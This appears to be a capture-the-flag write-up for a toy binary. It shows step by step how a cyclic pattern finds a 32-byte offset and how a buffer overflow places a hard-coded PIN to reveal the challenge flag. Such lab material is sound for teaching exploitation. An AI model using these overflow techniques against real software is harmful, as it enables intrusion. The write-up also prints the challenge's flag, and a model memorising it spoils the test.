# Solution

1. Use the `exit` command and place in a cyclic payload into the PIN area to get the offset.

```bash
# cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```bash
# ./capture-the-flag
Capture the Flag!!!
Available commands: ls, cat <file>, exit

$ exit

Before you leave, please enter the PIN: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

A: aaaabaaacaaadaaaeaaafaaagaaahaaa
B: iaaaja

Incorrect PIN. Better luck next time!
zsh: segmentation fault  ./capture-the-flag
```

```bash
# cyclic -l iaaaja
32
```

2. In the C program, the PIN is `"512524"`. So now we should create a payload that contains `"512524"` after 32 characters.

```c
#define PIN "512524"
```

```bash
# ./capture-the-flag
Capture the Flag!!!
Available commands: ls, cat <file>, exit

$ exit

Before you leave, please enter the PIN: aaaabaaacaaadaaaeaaafaaagaaahaaa512524

A: aaaabaaacaaadaaaeaaafaaagaaahaaa
B: 512524


Congrats! Here's your flag: SIG24{Buff3r_0v3rfl0w_1s_FuN!}
zsh: segmentation fault  ./capture-the-flag
```